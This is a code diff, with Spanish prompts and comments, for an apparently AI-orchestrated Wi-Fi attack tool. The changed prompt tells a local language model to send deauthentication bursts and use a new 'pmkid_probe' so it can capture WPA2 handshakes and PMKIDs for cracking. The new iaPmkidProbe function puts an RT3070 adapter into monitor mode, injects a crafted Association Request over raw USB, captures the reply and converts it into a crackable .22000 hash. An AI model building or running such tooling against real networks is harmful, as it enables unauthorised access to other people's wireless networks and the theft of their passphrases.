@@ -1231,7 +1231,7 @@ window.iaAttack = async function () {
       'Para forzar tráfico usa deauth_burst (RT3070 WinUSB) o trigger_handshake (si no hay clientes): SÍ están disponibles y funcionan. No propongas herramientas que no existan (ni wps_pin ni deauth por Npcap). No repitas pasos. Si hay material .22000, ve directo a inspeccionar/crackear. Termina con restore_managed si activaste monitor.',
       'Para convert_pcap/inspect_hash/crack_hash puedes poner rutas de marcador de posición: el orquestador las sustituirá por los archivos reales generados en cada paso.',
       'Si el objetivo es WPA2-PSK sin PMKID y no hay MFPR, incluye deauth_burst (RT3070 WinUSB) con el BSSID y canal reales para forzar un handshake.',
-      'NO uses trigger_handshake en este equipo: medido con veredicto negativo (Windows no expone el EAPOL de su propia asociación). Para generar tráfico usa SIEMPRE deauth_burst por RT3070 WinUSB.',
+      'NO uses trigger_handshake en este equipo: veredicto negativo. Para generar tráfico usa deauth_burst (RT3070) y, si el AP no tiene clientes, usa pmkid_probe (Association Request fabricada por USB crudo) para provocar PMKID.',
     ].join('\n') + (window.iaMemoryContext ? await window.iaMemoryContext() : '');
     const model = valOrEmpty($('ia-model')?.value) || null;
     let plan = await window.__invoke('ollama_tools', { prompt, model });
@@ -1341,7 +1341,9 @@ window.iaAttack = async function () {
           ? await window.iaDeauthBurst(args)
           : name === 'trigger_handshake'
             ? await window.iaTriggerHandshake(args)
-            : await window.iaExecuteTool(name, args);
+            : name === 'pmkid_probe'
+              ? await window.iaPmkidProbe(args)
+              : await window.iaExecuteTool(name, args);
         if (name === 'activate_monitor' && result && result.success && (args.iface_guid || ctx.guid)) {
           try {
             const sc = await window.__invoke('set_monitor_channel', {
@@ -1492,6 +1494,34 @@ window.iaTriggerHandshake = async function (args) {
     pcapng: probe.output_file,
     hashes: conv.hashes,
     message: '⚡ .22000 válido con ' + conv.hashes + ' handshake(s): ' + conv.output_file,
+  };
+};
+
+// ── E0-25: provocar PMKID con Association Request fabricada (RT3070) ────────
+window.iaPmkidProbe = async function (args) {
+  const bssid = String(args.bssid || '').toUpperCase();
+  const ssid = String(args.ssid || '').trim();
+  const ch = parseInt(args.channel) || selectedChannel() || 11;
+  if (!bssid || !ssid) throw new Error('pmkid_probe sin BSSID/SSID');
+  const rep = await window.__invoke('detect_adapters');
+  const ad = ((rep && rep.adapters) || []).find(a => a.guid && (a.monitor_capable || a.monitor_active));
+  if (!ad) throw new Error('sin adaptador monitor');
+  await window.__invoke('activate_monitor', { ifaceGuid: ad.guid, channel: ch });
+  await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: ch });
+  // Capturar ANTES de enviar la Association Request para no perder la respuesta.
+  const capPromise = window.__invoke('native_capture', { ifaceGuid: ad.guid, durationSecs: 12 });
+  await new Promise(r => setTimeout(r, 1200));
+  const tx = await window.__invoke('usb_raw_assoc', { ssid, bssid, channel: ch });
+  log('[pmkid] ' + (tx && tx.message || 'sin respuesta del TX'), (tx && tx.success) ? 'ok' : 'warn');
+  const cap = await capPromise;
+  if (!(cap && cap.success)) throw new Error('captura fallida');
+  const conv = await window.__invoke('convert_assoc_pmkid', { pcapPath: cap.output_file, ssid, bssid });
+  if (!(conv && conv.success)) throw new Error((conv && conv.message) || 'sin PMKID en la respuesta');
+  let total = 0;
+  try { const ins = await window.__invoke('inspect_hash', { hashPath: conv.output_file }); total = parseInt(ins && ins.total) || 0; } catch {}
+  return {
+    success: total > 0, output_file: conv.output_file, pcapng: cap.output_file, hashes: total,
+    message: '⚡ PMKID real (' + total + ') en ' + conv.output_file,
   };
 };
 
